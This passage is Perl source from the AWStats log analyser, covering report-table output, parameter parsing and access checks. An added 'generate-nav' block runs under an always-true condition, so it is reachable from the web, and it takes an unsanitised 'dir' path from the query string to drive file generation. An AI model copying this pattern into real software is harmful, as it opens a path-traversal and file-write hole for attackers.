		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			&BuildKeyList(
				$MaxNbOfExtra[$extranum],
				$MinHitExtra[$extranum],
				\%{ '_section_' . $extranum . '_h' },
				\%{ '_section_' . $extranum . '_p' }
			);
		}
		else {
			&BuildKeyList(
				$MaxNbOfExtra[$extranum],
				$MinHitExtra[$extranum],
				\%{ '_section_' . $extranum . '_h' },
				\%{ '_section_' . $extranum . '_h' }
			);
		}
	}
	else {
		@keylist = ();
	}
	my %keysinkeylist = ();
	foreach my $key (@keylist) {
		$keysinkeylist{$key} = 1;
		my $firstcol = CleanXSS( DecodeEncodedString($key) );
		$total_p += ${ '_section_' . $extranum . '_p' }{$key};
		$total_h += ${ '_section_' . $extranum . '_h' }{$key};
		$total_k += ${ '_section_' . $extranum . '_k' }{$key};
		print "<tr>";
		printf(
			"<td class=\"aws\">$ExtraFirstColumnFormat[$extranum]</td>",
			$firstcol, $firstcol, $firstcol, $firstcol, $firstcol );
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			print "<td>"
			  . ${ '_section_' . $extranum . '_p' }{$key} . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
			print "<td>"
			  . ${ '_section_' . $extranum . '_h' }{$key} . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
			print "<td>"
			  . Format_Bytes(
				${ '_section_' . $extranum . '_k' }{$key} )
			  . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
			print "<td>"
			  . (
				${ '_section_' . $extranum . '_l' }{$key}
				? Format_Date(
					${ '_section_' . $extranum . '_l' }{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";
		$count++;
	}

	# If we ask average or sum, we loop on all other records
	if ( $ExtraAddAverageRow[$extranum] || $ExtraAddSumRow[$extranum] )
	{
		foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
			if ( $keysinkeylist{$_} ) { next; }
			$total_p += ${ '_section_' . $extranum . '_p' }{$_};
			$total_h += ${ '_section_' . $extranum . '_h' }{$_};
			$total_k += ${ '_section_' . $extranum . '_k' }{$_};
			$count++;
		}
	}

	# Add average row
	if ( $ExtraAddAverageRow[$extranum] ) {
		print "<tr>";
		print "<td class=\"aws\"><b>" . _t("Average") . "</b></td>";
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			print "<td>"
			  . ( $count ? Format_Number(( $total_p / $count )) : "&nbsp;" ) . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
			print "<td>"
			  . ( $count ? Format_Number(( $total_h / $count )) : "&nbsp;" ) . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
			print "<td>"
			  . (
				$count ? Format_Bytes( $total_k / $count ) : "&nbsp;" )
			  . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
			print "<td>&nbsp;</td>";
		}
		print "</tr>\n";
	}

	# Add sum row
	if ( $ExtraAddSumRow[$extranum] ) {
		print "<tr>";
		print "<td class=\"aws\"><b>" . _t("Sum") . "</b></td>";
		if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
			print "<td>" . Format_Number(($total_p)) . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
			print "<td>" . Format_Number(($total_h)) . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
			print "<td>" . Format_Bytes($total_k) . "</td>";
		}
		if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
			print "<td>&nbsp;</td>";
		}
		print "</tr>\n";
	}
	&tab_end();
}
return 1 if $TEST_MODE;
#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
unless ($TEST_MODE) {
( $DIR  = $0 ) =~ s/([^\/\\]+)$//;
( $PROG = $1 ) =~ s/\.([^\.]*)$//;
$Extension = $1;
$DIR ||= '.';
$DIR =~ s/([^\/\\])[\\\/]+$/$1/;

$starttime = time();

# Get current time (time when AWStats was started)
( $nowsec, $nowmin, $nowhour, $nowday, $nowmonth, $nowyear, $nowwday, $nowyday )
  = localtime($starttime);
$nowweekofmonth = int( $nowday / 7 );
$nowweekofyear  =
  int( ( $nowyday - 1 + 6 - ( $nowwday == 0 ? 6 : $nowwday - 1 ) ) / 7 ) + 1;
if ( $nowweekofyear > 52 ) { $nowweekofyear = 1; }
$nowdaymod = $nowday % 7;
$nowwday++;
$nowns = Time::Local::timegm( 0, 0, 0, $nowday, $nowmonth, $nowyear );

if ( $nowdaymod <= $nowwday ) {
	if ( ( $nowwday != 7 ) || ( $nowdaymod != 0 ) ) {
		$nowweekofmonth = $nowweekofmonth + 1;
	}
}
if ( $nowdaymod > $nowwday ) { $nowweekofmonth = $nowweekofmonth + 2; }

# Change format of time variables
$nowweekofmonth = "0$nowweekofmonth";
if ( $nowweekofyear < 10 ) { $nowweekofyear = "0$nowweekofyear"; }
if ( $nowyear < 100 ) { $nowyear += 2000; }
else { $nowyear += 1900; }
$nowsmallyear = $nowyear;
$nowsmallyear =~ s/^..//;
if ( ++$nowmonth < 10 ) { $nowmonth = "0$nowmonth"; }
if ( $nowday < 10 )     { $nowday   = "0$nowday"; }
if ( $nowhour < 10 )    { $nowhour  = "0$nowhour"; }
if ( $nowmin < 10 )     { $nowmin   = "0$nowmin"; }
if ( $nowsec < 10 )     { $nowsec   = "0$nowsec"; }
$nowtime = int( $nowyear . $nowmonth . $nowday . $nowhour . $nowmin . $nowsec );

# Get tomorrow time (will be used to discard some record with corrupted date (future date))
my (
	$tomorrowsec, $tomorrowmin,   $tomorrowhour,
	$tomorrowday, $tomorrowmonth, $tomorrowyear
  )
  = localtime( $starttime + 86400 );
if ( $tomorrowyear < 100 ) { $tomorrowyear += 2000; }
else { $tomorrowyear += 1900; }
if ( ++$tomorrowmonth < 10 ) { $tomorrowmonth = "0$tomorrowmonth"; }
if ( $tomorrowday < 10 )     { $tomorrowday   = "0$tomorrowday"; }
if ( $tomorrowhour < 10 )    { $tomorrowhour  = "0$tomorrowhour"; }
if ( $tomorrowmin < 10 )     { $tomorrowmin   = "0$tomorrowmin"; }
if ( $tomorrowsec < 10 )     { $tomorrowsec   = "0$tomorrowsec"; }
$tomorrowtime =
  int(  $tomorrowyear
	  . $tomorrowmonth
	  . $tomorrowday
	  . $tomorrowhour
	  . $tomorrowmin
	  . $tomorrowsec );

# Allowed option
my @AllowedCLIArgs = (
	'migrate',            'config',
	'logfile',            'output',
	'runascli',           'update',
	'staticlinks',        'staticlinksext',
	'noloadplugin',       'loadplugin',
	'hostfilter',         'urlfilter',
	'refererpagesfilter', 'lang',
	'month',              'year',
	'framename',          'debug',
	'showsteps',          'showdropped',
	'showcorrupted',      'showunknownorigin',
	'showdirectorigin',   'limitflush',
    'nboflastupdatelookuptosave',
	'confdir',            'updatefor',
	'hostfilter',         'hostfilterex',
	'urlfilter',          'urlfilterex',
	'refererpagesfilter', 'refererpagesfilterex',
	'pluginmode',         'filterrawlog', 
	'generate-nav' 
);

# Parse input parameters and sanitize them for security reasons
$QueryString = '';

# AWStats use GATEWAY_INTERFACE to known if ran as CLI or CGI. AWSTATS_DEL_GATEWAY_INTERFACE can
# be set to force AWStats to be ran as CLI even from a web page.
if ( $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'} ) { $ENV{'GATEWAY_INTERFACE'} = ''; }
if ( $ENV{'GATEWAY_INTERFACE'} ) {    # Run from a browser as CGI
	$DebugMessages = 0;

	# Prepare QueryString
	if ( $ENV{'CONTENT_LENGTH'} ) {
		binmode STDIN;
		read( STDIN, $QueryString, $ENV{'CONTENT_LENGTH'} );
	}
	if ( $ENV{'QUERY_STRING'} ) {
		$QueryString = $ENV{'QUERY_STRING'};

		# Set & and &amp; to &amp;
		$QueryString =~ s/&amp;/&/g;
		$QueryString =~ s/&/&amp;/g;
	}

	# Remove all XSS vulnerabilities coming from AWStats parameters
	$QueryString = CleanXSS( &DecodeEncodedString($QueryString) );

	# Security test
	if ( $QueryString =~ /LogFile=([^&]+)/i ) {
		error(
"Logfile parameter can't be overwritten when AWStats is used from a CGI"
		);
	}

	# No update but report by default when run from a browser
	$UpdateStats = ( $QueryString =~ /update=1/i ? 1 : 0 );

	if ( $QueryString =~ /config=([^&]+)/i ) { 
		$SiteConfig = &Sanitize("$1");
	}
	if ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = "$1"; }
	if ( $QueryString =~ /pluginmode=([^&]+)/i ) {
		$PluginMode = &Sanitize( "$1", 1 );
	}
	if ( $QueryString =~ /configdir=([^&]+)/i ) {
		$DirConfig = &Sanitize("$1");
		$DirConfig =~ s/\\{2,}/\\/g;	# This is to clean Remote URL
		$DirConfig =~ s/\/{2,}/\//g;	# This is to clean Remote URL
	}

	# All filters
	if ( $QueryString =~ /hostfilter=([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	}    # Filter on host list can also be defined with hostfilter=filter
	if ( $QueryString =~ /hostfilterex=([^&]+)/i ) {
		$FilterEx{'host'} = "$1";
	}    #
	if ( $QueryString =~ /urlfilter=([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	}    # Filter on URL list can also be defined with urlfilter=filter
	if ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = "$1"; } #
	if ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} # Filter on referer list can also be defined with refererpagesfilter=filter
	if ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {
		$FilterEx{'refererpages'} = "$1";
	}    #
	     # All output
	if ( $QueryString =~ /output=allhosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=urldetail:([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=refererpages:([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed

	# If migrate
	if ( $QueryString =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {
		$MigrateStats = &Sanitize("$2");

		$MigrateStats =~ /^(.*)$PROG(\d{0,2})(\d\d)(\d\d\d\d)(.*)\.txt$/;
		$SiteConfig = &Sanitize($5 ? $5 : 'xxx');
		$SiteConfig =~ s/^\.//;    # SiteConfig is used to find config file
	}

	$SiteConfig =~ s/\.\.//g; 		# Avoid directory transversal
}
else {                             # Run from command line
	$DebugMessages = 1;

	# Prepare QueryString
	for ( 0 .. @ARGV - 1 ) {

		# If migrate
		if ( $ARGV[$_] =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {
			$MigrateStats = &Sanitize("$2");

			$MigrateStats =~ /^(.*)$PROG(\d{0,2})(\d\d)(\d\d\d\d)(.*)\.txt$/;
			$SiteConfig = &Sanitize($5 ? $5 : 'xxx');
			$SiteConfig =~ s/^\.//;    # SiteConfig is used to find config file
			next;
		}

		# TODO Check if ARGV is in @AllowedArg
		if ($QueryString) { $QueryString .= '&amp;'; }
		my $NewLinkParams = $ARGV[$_];
		$NewLinkParams =~ s/^-+//;
		$QueryString .= "$NewLinkParams";
	}

	# Remove all XSS vulnerabilities coming from AWStats parameters
	$QueryString = CleanXSS($QueryString);

	# Security test
	if (   $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'}
		&& $QueryString =~ /LogFile=([^&]+)/i )
	{
		error(
"Logfile parameter can't be overwritten when AWStats is used from a CGI"
		);
	}

	# Update with no report by default when run from command line
	$UpdateStats = 1;

	if ( $QueryString =~ /config=([^&]+)/i ) { 
		$SiteConfig = &Sanitize("$1"); 
	}
	if ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = "$1"; }
	if ( $QueryString =~ /pluginmode=([^&]+)/i ) {
		$PluginMode = &Sanitize( "$1", 1 );
	}
	if ( $QueryString =~ /configdir=([^&]+)/i ) {
		$DirConfig = &Sanitize("$1");
		$DirConfig =~ s/\\{2,}/\\/g;	# This is to clean Remote URL
		$DirConfig =~ s/\/{2,}/\//g;	# This is to clean Remote URL
	}

	# All filters
	if ( $QueryString =~ /hostfilter=([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	}    # Filter on host list can also be defined with hostfilter=filter
	if ( $QueryString =~ /hostfilterex=([^&]+)/i ) {
		$FilterEx{'host'} = "$1";
	}    #
	if ( $QueryString =~ /urlfilter=([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	}    # Filter on URL list can also be defined with urlfilter=filter
	if ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = "$1"; } #
	if ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} # Filter on referer list can also be defined with refererpagesfilter=filter
	if ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {
		$FilterEx{'refererpages'} = "$1";
	}    #
	     # All output
	if ( $QueryString =~ /output=allhosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=urldetail:([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=refererpages:([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed
	  # Config parameters
	if ( $QueryString =~ /LogFile=([^&]+)/i ) { $LogFile = "$1"; }

	# If show options
	if ( $QueryString =~ /showsteps/i ) {
		$ShowSteps = 1;
		$QueryString =~ s/showsteps[^&]*//i;
	}
	if ( $QueryString =~ /showcorrupted/i ) {
		$ShowCorrupted = 1;
		$QueryString =~ s/showcorrupted[^&]*//i;
	}
	if ( $QueryString =~ /showdropped/i ) {
		$ShowDropped = 1;
		$QueryString =~ s/showdropped[^&]*//i;
	}
	if ( $QueryString =~ /showunknownorigin/i ) {
		$ShowUnknownOrigin = 1;
		$QueryString =~ s/showunknownorigin[^&]*//i;
	}
	if ( $QueryString =~ /showdirectorigin/i ) {
		$ShowDirectOrigin = 1;
		$QueryString =~ s/showdirectorigin[^&]*//i;
	}
	
	$SiteConfig =~ s/\.\.//g; 
}

if ( $QueryString =~ /(^|&|&amp;)staticlinks/i ) {
	$StaticLinks = "$PROG.$SiteConfig";
}
if ( $QueryString =~ /(^|&|&amp;)staticlinks=([^&]+)/i ) {
	$StaticLinks = "$2";
}    # When ran from awstatsbuildstaticpages.pl
if ( $QueryString =~ /(^|&|&amp;)staticlinksext=([^&]+)/i ) {
	$StaticExt = "$2";
}
if ( $QueryString =~ /(^|&|&amp;)framename=([^&]+)/i ) { $FrameName = "$2"; }
if ( $QueryString =~ /(^|&|&amp;)debug=(\d+)/i )       { $Debug     = $2; }
if ( $QueryString =~ /(^|&|&amp;)databasebreak=(\w+)/i ) {
	$DatabaseBreak = $2;
}
if ( $QueryString =~ /(^|&|&amp;)updatefor=(\d+)/i ) { $UpdateFor = $2; }

if ( $QueryString =~ /(^|&|&amp;)noloadplugin=([^&]+)/i ) {
	foreach ( split( /,/, $2 ) ) { $NoLoadPlugin{ &Sanitize( "$_", 1 ) } = 1; }
}
if ( $QueryString =~ /(^|&|&amp;)limitflush=(\d+)/i ) { $LIMITFLUSH = $2; }
if ( $QueryString =~ /(^|&|&amp;)nboflastupdatelookuptosave=(\d+)/i ) { $NBOFLASTUPDATELOOKUPTOSAVE = $2; }

# Get/Define output
if ( $QueryString =~
	/(^|&|&amp;)output(=[^&]*|)(.*)(&|&amp;)output(=[^&]*|)(&|$)/i )
{
	error( "Only 1 output option is allowed", "", "", 1 );
}
if ( $QueryString =~ /(^|&|&amp;)output(=[^&]*|)(&|$)/i ) {

	# At least one output expected. We define %HTMLOutput
	my $outputlist = "$2";
	if ($outputlist) {
		$outputlist =~ s/^=//;
		foreach my $outputparam ( split( /,/, $outputlist ) ) {
			$outputparam =~ s/:(.*)$//;
			if ($outputparam) { $HTMLOutput{ lc($outputparam) } = "$1" || 1; }
		}
	}

	# If on command line and no update
	if ( !$ENV{'GATEWAY_INTERFACE'} && $QueryString !~ /update/i ) {
		$UpdateStats = 0;
	}

	# If no output defined, used default value
	if ( !scalar keys %HTMLOutput ) { $HTMLOutput{'main'} = 1; }
}
if ( $ENV{'GATEWAY_INTERFACE'} && !scalar keys %HTMLOutput ) {
	$HTMLOutput{'main'} = 1;
}

# Remove -output option with no = from QueryString
$QueryString =~ s/(^|&|&amp;)output(&|$)/$1$2/i;
$QueryString =~ s/&+$//;

# Check year, month, day, hour parameters
if ( $QueryString =~ /(^|&|&amp;)month=(year)/i ) {
	error("month=year is a deprecated option. Use month=all instead.");
}
if ( $QueryString =~ /(^|&|&amp;)year=(\d\d\d\d)/i ) {
	$YearRequired = sprintf( "%04d", $2 );
}
else { $YearRequired = "$nowyear"; }
if ( $QueryString =~ /(^|&|&amp;)month=(\d{1,2})/i ) {
	$MonthRequired = sprintf( "%02d", $2 );
}
elsif ( $QueryString =~ /(^|&|&amp;)month=(all)/i ) { $MonthRequired = 'all'; }
else { $MonthRequired = "$nowmonth"; }
if ( $QueryString =~ /(^|&|&amp;)day=(\d{1,2})/i ) {
	$DayRequired = sprintf( "%02d", $2 );
} # day is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.
else { $DayRequired = ''; }
if ( $QueryString =~ /(^|&|&amp;)hour=(\d{1,2})/i ) {
	$HourRequired = sprintf( "%02d", $2 );
} # hour is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.
else { $HourRequired = ''; }

# Check parameter validity
# TODO

# Print AWStats and Perl version
if ($Debug) {
	debug( ucfirst($PROG) . " - $VERSION - Perl $^X $]", 1 );
	debug( "DIR=$DIR PROG=$PROG Extension=$Extension",   2 );
	debug( "QUERY_STRING=$QueryString",                  2 );
	debug( "HTMLOutput=" . join( ',', keys %HTMLOutput ), 1 );
	debug( "YearRequired=$YearRequired, MonthRequired=$MonthRequired", 2 );
	debug( "DayRequired=$DayRequired, HourRequired=$HourRequired",     2 );
	debug( "UpdateFor=$UpdateFor",                                     2 );
	debug( "PluginMode=$PluginMode",                                   2 );
	debug( "DirConfig=$DirConfig",                                     2 );
}

# Force SiteConfig if AWSTATS_FORCE_CONFIG is defined
if ( $ENV{'AWSTATS_CONFIG'} ) {
	$ENV{'AWSTATS_FORCE_CONFIG'} = $ENV{'AWSTATS_CONFIG'};
}    # For backward compatibility
if ( $ENV{'AWSTATS_FORCE_CONFIG'} ) {
	if ($Debug) {
		debug(  "AWSTATS_FORCE_CONFIG parameter is defined to '"
			  . $ENV{'AWSTATS_FORCE_CONFIG'}
			  . "'. $PROG will use this as config value." );
	}
	$SiteConfig = &Sanitize( $ENV{'AWSTATS_FORCE_CONFIG'} );
}

# Display version information
if ( $QueryString =~ /(^|&|&amp;)version/i ) {
	print "$PROG $VERSION\n";
	exit 0;
}
# Display help information
if ( ( !$ENV{'GATEWAY_INTERFACE'} ) && ( !$SiteConfig ) ) {
	&print_help();
	exit 2;
}

$SiteConfig ||= &Sanitize( $ENV{'SERVER_NAME'} );

#$ENV{'SERVER_NAME'}||=$SiteConfig;	# For thoose who use __SERVER_NAME__ in conf file and use CLI.
$ENV{'AWSTATS_CURRENT_CONFIG'} = $SiteConfig;

# Read config file (SiteConfig must be defined)
&Read_Config($DirConfig);

# Check language
if ( $QueryString =~ /(^|&|&amp;)lang=([^&]+)/i ) { $Lang = "$2"; }
if ( !$Lang || $Lang eq 'auto' ) {    # If lang not defined or forced to auto
	my $langlist = $ENV{'HTTP_ACCEPT_LANGUAGE'} || '';
	$langlist =~ s/;[^,]*//g;
	if ($Debug) {
		debug(
			"Search an available language among HTTP_ACCEPT_LANGUAGE=$langlist",
			1
		);
	}
	foreach my $code ( split( /,/, $langlist ) )
	{                                 # Search for a valid lang in priority
		if ( $LangBrowserToLangAwstats{$code} ) {
			$Lang = $LangBrowserToLangAwstats{$code};
			if ($Debug) { debug( " Will try to use Lang=$Lang", 1 ); }
			last;
		}
		$code =~ s/-.*$//;
		if ( $LangBrowserToLangAwstats{$code} ) {
			$Lang = $LangBrowserToLangAwstats{$code};
			if ($Debug) { debug( " Will try to use Lang=$Lang", 1 ); }
			last;
		}
	}
}
if ( !$Lang || $Lang eq 'auto' ) {
	if ($Debug) {
		debug( " No language defined or available. Will use Lang=en", 1 );
	}
	$Lang = 'en';
}

# Check and correct bad parameters
&Check_Config();

# Now SiteDomain is defined

if ( $Debug && !$DebugMessages ) {
	error(
"Debug has not been allowed. Change DebugMessages parameter in config file to allow debug."
	);
}

# Define frame name and correct variable for frames
if ( !$FrameName ) {
	if (   $ENV{'GATEWAY_INTERFACE'}
		&& $UseFramesWhenCGI
		&& $HTMLOutput{'main'}
		&& !$PluginMode )
	{
		$FrameName = 'index';
	}
	else { $FrameName = 'main'; }
}

# Load Message files, Reference data files and Plugins
if ($Debug) { debug( "FrameName=$FrameName", 1 ); }
if ( $FrameName ne 'index' ) {
	&Read_Language_Data($Lang);
	# nav.html
	if ( ($ENV{'GATEWAY_INTERFACE'} || !$ENV{'GATEWAY_INTERFACE'}) && 
		$QueryString =~ /(^|&|&amp;|^)generate-nav/i ) {
		
		my $dir = '';
		my @months = ();
		
		# 从 QueryString 或命令行参数获取
		if ( $QueryString =~ /dir=([^&]+)/i ) {
			$dir = $1;
		} else {
			# 尝试从命令行参数获取
			for my $i (0 .. $#ARGV) {
				if ($ARGV[$i] =~ /dir=(.+)/) {
					$dir = $1;
					last;
				}
			}
		}
		
		if ( $QueryString =~ /months=([^&]+)/i ) {
			@months = split(' ', $1);
		} else {
			for my $i (0 .. $#ARGV) {
				if ($ARGV[$i] =~ /months=(.+)/) {
					@months = split(' ', $1);
					last;
				}
			}
		}
		
		# 获取当前月份
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$year += 1900;
		$mon += 1;
		my $current_month = sprintf("%04d-%02d", $year, $mon);
		
		generate_nav_page($dir, $current_month, \@months);
		generate_index_page($dir, $current_month);
		generate_what_doc($dir);
		generate_changelog_doc($dir);
		generate_benchmark_doc($dir);
		generate_compare_doc($dir);
		generate_config_doc($dir);
		generate_contrib_doc($dir);
		generate_devgraphs_doc($dir);
		generate_devhooks_doc($dir);
		generate_devplugins_doc($dir);
		generate_dolibarr_doc($dir);
		generate_extra_doc($dir);
		generate_faq_doc($dir);
		generate_glossary_doc($dir);
		generate_license_doc($dir);
		generate_loganalysispaper_doc($dir);
		generate_security_doc($dir);
		generate_setup_doc($dir);
		generate_tools_doc($dir);
		generate_upgrade_doc($dir);
		generate_webmin_doc($dir);
		generate_home_doc($dir);
		exit 0;
	}

	if ( $FrameName ne 'mainleft' ) {
		my %datatoload = ();
		my (
			$filedomains, $filemime, $filerobots, $fileworms,
			$filebrowser, $fileos,   $filese
		  )
		  = (
			'domains',  'mime',
			'robots',   'worms',
			'browsers', 'operating_systems',
			'search_engines'
		  );
		my ( $filestatushttp, $filestatussmtp ) =
		  ( 'status_http', 'status_smtp' );
		if ( $LevelForBrowsersDetection eq 'allphones' ) {
			$filebrowser = 'browsers_phone';
		}
		if ($UpdateStats) {    # If update
			if ($LevelForFileTypesDetection) {
				$datatoload{$filemime} = 1;
			}                  # Only if need to filter on known extensions
			if ($LevelForRobotsDetection) {
				$datatoload{$filerobots} = 1;
			}                  # ua
			if ($LevelForWormsDetection) {
				$datatoload{$fileworms} = 1;
			}                  # url
			if ($LevelForBrowsersDetection) {
				$datatoload{$filebrowser} = 1;
			}                  # ua
			if ($LevelForOSDetection) {
				$datatoload{$fileos} = 1;
			}                  # ua
			if ($LevelForRefererAnalyze) {
				$datatoload{$filese} = 1;
			}                  # referer
			                   # if (...) { $datatoload{'referer_spam'}=1; }
		}
		if ( scalar keys %HTMLOutput ) {    # If output
			if ( $ShowDomainsStats || $ShowHostsStats ) {
				$datatoload{$filedomains} = 1;
			} # TODO Replace by test if ($ShowDomainsStats) when plugins geoip can force load of domains datafile.
			if ($ShowFileTypesStats)  { $datatoload{$filemime}       = 1; }
			if ($ShowRobotsStats)     { $datatoload{$filerobots}     = 1; }
			if ($ShowWormsStats)      { $datatoload{$fileworms}      = 1; }
			if ($ShowBrowsersStats)   { $datatoload{$filebrowser}    = 1; }
			if ($ShowOSStats)         { $datatoload{$fileos}         = 1; }
			if ($ShowOriginStats)     { $datatoload{$filese}         = 1; }
			if ($ShowHTTPErrorsStats) { $datatoload{$filestatushttp} = 1; }
			if ($ShowSMTPErrorsStats) { $datatoload{$filestatussmtp} = 1; }
		}
		&Read_Ref_Data( keys %datatoload );
	}
	&Read_Plugins();
}

# Here charset is defined, so we can send the http header (Need BuildReportFormat,PageCode)
if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {
	http_head();
}    # Run from a browser as CGI

# Init other parameters
$NBOFLINESFORBENCHMARK--;
if ( $ENV{'GATEWAY_INTERFACE'} ) { $DirCgi = ''; }
if ( $DirCgi && !( $DirCgi =~ /\/$/ ) && !( $DirCgi =~ /\\$/ ) ) {
	$DirCgi .= '/';
}
if ( !$DirData || $DirData =~ /^\./ ) {
	if ( !$DirData || $DirData eq '.' ) {
		$DirData = "$DIR";
	}    # If not defined or chosen to '.' value then DirData is current dir
	elsif ( $DIR && $DIR ne '.' ) { $DirData = "$DIR/$DirData"; }
}
$DirData ||= '.';    # If current dir not defined then we put it to '.'
$DirData =~ s/[\\\/]+$//;

if ( $FirstDayOfWeek == 1 ) { @DOWIndex = ( 1, 2, 3, 4, 5, 6, 0 ); }
else { @DOWIndex = ( 0, 1, 2, 3, 4, 5, 6 ); }

# Should we link to ourselves or to a wrapper script
$AWScript = ( $WrapperScript ? "$WrapperScript" : "$DirCgi$PROG.$Extension" );
if (index($AWScript,'?')>-1) 
{
    $AWScript .= '&amp;';   # $AWScript contains URL parameters
}
else 
{
    $AWScript .= '?';
}


# Print html header (Need HTMLOutput,Expires,Lang,StyleSheet,HTMLHeadSectionExpires defined by Read_Config, PageCode defined by Read_Language_Data)
if ( !$HeaderHTMLSent ) { &html_head; }

# AWStats output is replaced by a plugin output
if ($PluginMode) {

	#	my $function="BuildFullHTMLOutput_$PluginMode()";
	#	eval("$function");
	my $function = "BuildFullHTMLOutput_$PluginMode";
	&$function();
	if ( $? || $@ ) { error("$@"); }
	&html_end(0);
	exit 0;
}

# Security check
if ( $AllowAccessFromWebToAuthenticatedUsersOnly && $ENV{'GATEWAY_INTERFACE'} )
{
	if ($Debug) { debug( "REMOTE_USER=" . $ENV{"REMOTE_USER"} ); }
	if ( !$ENV{"REMOTE_USER"} ) {
		error(
"Access to statistics is only allowed from an authenticated session to authenticated users."
		);
	}
	if (@AllowAccessFromWebToFollowingAuthenticatedUsers) {
		my $userisinlist = 0;
		my $remoteuser   = quotemeta( $ENV{"REMOTE_USER"} );
		$remoteuser =~ s/\s/%20/g
		  ; # Allow authenticated user with space in name to be compared to allowed user list
		my $currentuser = qr/^$remoteuser$/i;    # Set precompiled regex
		foreach (@AllowAccessFromWebToFollowingAuthenticatedUsers) {
			if (/$currentuser/o) { $userisinlist = 1; last; }
		}
		if ( !$userisinlist ) {
			error(  "User '"
				  . $ENV{"REMOTE_USER"}
				  . "' is not allowed to access statistics of this domain/config."
			);
		}
	}
}
if ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {
	my $IPAddress     = $ENV{"REMOTE_ADDR"};                  # IPv4 or IPv6
	my $useripaddress = &Convert_IP_To_Decimal($IPAddress);
	my @allowaccessfromipaddresses =
	  split( /[\s,]+/, $AllowAccessFromWebToFollowingIPAddresses );
	my $allowaccess = 0;
	foreach my $ipaddressrange (@allowaccessfromipaddresses) {
		if ( $ipaddressrange !~
			/^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/
			&& $ipaddressrange !~
			/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
		{
			error(
"AllowAccessFromWebToFollowingIPAddresses is defined to '$AllowAccessFromWebToFollowingIPAddresses' but part of value does not match the correct syntax: IPv4AddressMin[-IPv4AddressMax] or IPv6Address[\/prefix] in \"$ipaddressrange\""
			);
		}

		# Test ip v4
		if ( $ipaddressrange =~
			/^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/ )
		{
			my $ipmin = &Convert_IP_To_Decimal($1);
			my $ipmax = $2 ? &Convert_IP_To_Decimal($2) : $ipmin;

			# Is it an authorized ip ?
			if ( ( $useripaddress >= $ipmin ) && ( $useripaddress <= $ipmax ) )
			{
				$allowaccess = 1;
				last;
			}
		}

		# Test ip v6
		if ( $ipaddressrange =~
			/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
		{
			if ( $ipaddressrange =~ /::\// ) {
				my @IPv6split = split( /::/, $ipaddressrange );
				if ( $IPAddress =~ /^$IPv6split[0]/ ) {
					$allowaccess = 1;
					last;
				}
			}
			elsif ( $ipaddressrange == $IPAddress ) {
				$allowaccess = 1;
				last;
			}
		}
	}
